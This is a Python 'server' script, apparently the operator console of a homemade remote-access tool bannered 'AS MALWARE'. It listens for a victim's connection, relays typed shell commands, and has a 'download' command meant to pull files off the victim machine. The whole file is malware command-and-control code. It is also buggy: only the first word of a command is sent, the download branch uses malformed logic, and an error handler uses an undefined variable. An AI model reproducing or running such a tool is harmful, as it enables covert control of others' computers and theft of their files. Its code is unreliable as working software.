#server 
import socket
import sys

print('''


    _    ____    __  __    _    _ __        ___    ____  _____ 
   / \  / ___|  |  \/  |  / \  | |\ \      / / \  |  _ \| ____|
  / _ \ \___ \  | |\/| | / _ \ | | \ \ /\ / / _ \ | |_) |  _|  
 / ___ \ ___) | | |  | |/ ___ \| |__\ V  V / ___ \|  _ <| |___ 
/_/   \_\____/  |_|  |_/_/   \_\_____\_/\_/_/   \_\_| \_\_____|
        
        @assajeeb3 -->twitter
        -h for help 


''')

if (sys.argv[1]=="-h"):
    print('''
    ----------help-------
    python3 server.py [ip] [port]
    ex - python3 server.py 127.0.0.1 34

    
    ''')
    sys.exit()
else:
    ip=sys.argv[1] 
port = int(sys.argv[2])



s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind((ip,port))
s.listen(1)
print("[+]server is listening...\n")
conn , addr = s.accept()
print(f"[+]Connect to {addr}")
# conn.send(b"Frist send")
# response = conn.recv(1024)
# print(response)

while (True):
    takeinput= input("shell>> ")
    commendsplit = takeinput.split()
    commend0 = str(commendsplit[0]) 
    try:
        downItm = str(commendsplit[1])
    except:
        pass
    if commend0 == "EXIT":
        conn.send(b"EXIT")
        conn.close()
        print("[+]connection close ")
        break
    elif commend0 == "download " & downItm == True:
        print("[+]sending commend to download file ..")
        conn.send(b"download "+ downItm.encode())
        print(b"download "+ downItm.encode())
        file = conn.recv(1024)
        try :
            with open(downItm,'wb') as f:
                f.write(file)
        except:
            print(f"[--]can not download or write the file for {e}")
        
    else:
        conn.send(commend0.encode())
        response = conn.recv(1024)
        print(response.decode())
